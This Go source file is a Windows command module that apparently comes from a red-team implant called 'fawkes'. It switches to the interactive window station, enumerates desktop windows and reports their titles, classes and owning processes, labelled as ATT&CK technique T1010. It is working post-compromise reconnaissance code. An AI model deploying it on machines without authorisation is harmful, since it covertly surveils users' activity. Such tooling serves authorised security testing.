//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type WindowsEnumCommand struct{}

func (c *WindowsEnumCommand) Name() string {
	return "windows"
}

func (c *WindowsEnumCommand) Description() string {
	return "Enumerate visible application windows (T1010)"
}

type weArgs struct {
	Action string `json:"action"`
	Filter string `json:"filter"`
	All    bool   `json:"all"`
}

var (
	user32WE             = windows.NewLazySystemDLL("user32.dll")
	weEnumDesktopWindows = user32WE.NewProc("EnumDesktopWindows")
	weGetTextW           = user32WE.NewProc("GetWindowTextW")
	weGetTextLenW        = user32WE.NewProc("GetWindowTextLengthW")
	weIsVisible          = user32WE.NewProc("IsWindowVisible")
	weGetTIDPID          = user32WE.NewProc("GetWindowThreadProcessId")
	weGetClassW          = user32WE.NewProc("GetClassNameW")
	weOpenDesktop        = user32WE.NewProc("OpenDesktopW")
	weCloseDesktop       = user32WE.NewProc("CloseDesktop")
	weOpenWinStation     = user32WE.NewProc("OpenWindowStationW")
	weSetProcessWinSta   = user32WE.NewProc("SetProcessWindowStation")
	weGetProcessWinSta   = user32WE.NewProc("GetProcessWindowStation")
	weCloseWinStation    = user32WE.NewProc("CloseWindowStation")
)

type weEntry struct {
	HWND      uintptr
	PID       uint32
	TID       uint32
	Title     string
	ClassName string
	Visible   bool
	Process   string
}

func (c *WindowsEnumCommand) Execute(task structs.Task) structs.CommandResult {
	var args weArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch args.Action {
	case "list", "search":
		return weDoEnum(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use: list, search)", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func weDoEnum(args weArgs) structs.CommandResult {
	var entries []weEntry

	// Switch to the interactive window station (WinSta0) to enumerate user windows
	// Save current window station to restore later
	origWinSta, _, _ := weGetProcessWinSta.Call()

	desktopName, _ := syscall.UTF16PtrFromString("Default")
	winStaName, _ := syscall.UTF16PtrFromString("WinSta0")

	// WINSTA_ENUMDESKTOPS | WINSTA_READATTRIBUTES
	hWinSta, _, _ := weOpenWinStation.Call(
		uintptr(unsafe.Pointer(winStaName)),
		0,
		0x0100|0x0002, // WINSTA_ENUMDESKTOPS | WINSTA_READATTRIBUTES
	)

	var hDesktop uintptr
	switched := false
	if hWinSta != 0 {
		weSetProcessWinSta.Call(hWinSta)
		switched = true

		// DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
		hDesktop, _, _ = weOpenDesktop.Call(
			uintptr(unsafe.Pointer(desktopName)),
			0,
			0, // FALSE
			0x0001|0x0040, // DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
		)
	}

	cb := syscall.NewCallback(func(hwnd uintptr, lparam uintptr) uintptr {
		visible, _, _ := weIsVisible.Call(hwnd)
		isVisible := visible != 0

		if !args.All && !isVisible {
			return 1
		}

		titleLen, _, _ := weGetTextLenW.Call(hwnd)
		title := ""
		if titleLen > 0 {
			buf := make([]uint16, titleLen+1)
			weGetTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(titleLen+1))
			title = syscall.UTF16ToString(buf)
		}

		if title == "" && !args.All {
			return 1
		}

		var pid uint32
		tid, _, _ := weGetTIDPID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

		classBuf := make([]uint16, 256)
		weGetClassW.Call(hwnd, uintptr(unsafe.Pointer(&classBuf[0])), 256)
		className := syscall.UTF16ToString(classBuf)

		procName := ""
		if pid > 0 {
			handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
			if err == nil {
				var buf [260]uint16
				size := uint32(260)
				err = windows.QueryFullProcessImageName(handle, 0, &buf[0], &size)
				if err == nil {
					full := syscall.UTF16ToString(buf[:size])
					parts := strings.Split(full, "\\")
					procName = parts[len(parts)-1]
				}
				windows.CloseHandle(handle)
			}
		}

		entries = append(entries, weEntry{
			HWND:      hwnd,
			PID:       pid,
			TID:       uint32(tid),
			Title:     title,
			ClassName: className,
			Visible:   isVisible,
			Process:   procName,
		})

		return 1
	})

	if hDesktop != 0 {
		weEnumDesktopWindows.Call(hDesktop, cb, 0)
		weCloseDesktop.Call(hDesktop)
	} else {
		// Fallback: enumerate current desktop windows
		weEnumDesktopWindows.Call(0, cb, 0)
	}

	// Restore original window station
	if switched {
		weSetProcessWinSta.Call(origWinSta)
		weCloseWinStation.Call(hWinSta)
	}

	// Apply search filter
	if args.Action == "search" && args.Filter != "" {
		filter := strings.ToLower(args.Filter)
		var filtered []weEntry
		for _, e := range entries {
			if strings.Contains(strings.ToLower(e.Title), filter) ||
				strings.Contains(strings.ToLower(e.Process), filter) ||
				strings.Contains(strings.ToLower(e.ClassName), filter) {
				filtered = append(filtered, e)
			}
		}
		entries = filtered
	}

	var sb strings.Builder
	sb.WriteString("[*] Application Window Discovery (T1010)\n")

	if args.Action == "search" && args.Filter != "" {
		sb.WriteString(fmt.Sprintf("[*] Filter: %q\n", args.Filter))
	}

	sb.WriteString(fmt.Sprintf("[+] Found %d windows\n\n", len(entries)))

	if len(entries) > 0 {
		sb.WriteString(fmt.Sprintf("%-8s %-6s %-25s %-30s %s\n",
			"HWND", "PID", "Process", "Class", "Title"))
		sb.WriteString(strings.Repeat("-", 120) + "\n")

		for _, e := range entries {
			vis := ""
			if !e.Visible {
				vis = " [hidden]"
			}
			title := e.Title
			if len(title) > 50 {
				title = title[:47] + "..."
			}
			sb.WriteString(fmt.Sprintf("0x%-6X %-6d %-25s %-30s %s%s\n",
				e.HWND, e.PID, wetrunc(e.Process, 25), wetrunc(e.ClassName, 30), title, vis))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func wetrunc(s string, max int) string {
	if len(s) > max {
		return s[:max-3] + "..."
	}
	return s
}
